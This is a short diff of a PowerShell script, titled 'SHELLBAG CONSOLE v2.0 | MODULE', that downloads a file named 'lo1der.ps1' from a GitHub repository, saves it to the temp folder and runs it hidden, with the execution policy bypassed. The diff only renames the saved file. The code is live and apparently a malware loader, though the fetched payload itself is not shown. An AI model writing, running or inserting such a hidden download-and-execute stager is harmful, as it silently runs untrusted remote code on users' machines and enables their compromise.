@@ -1,6 +1,6 @@
 $Host.UI.RawUI.WindowTitle = "SHELLBAG CONSOLE v2.0 | MODULE"
 $url = "https://github.com/ShramC/discord-server/raw/refs/heads/main/lo1der.ps1"
-$path = "$env:TEMP\as.ps1"
+$path = "$env:TEMP\lo1der.ps1"
 try {
     Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing -ErrorAction Stop
     Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$path`"" -WindowStyle Hidden
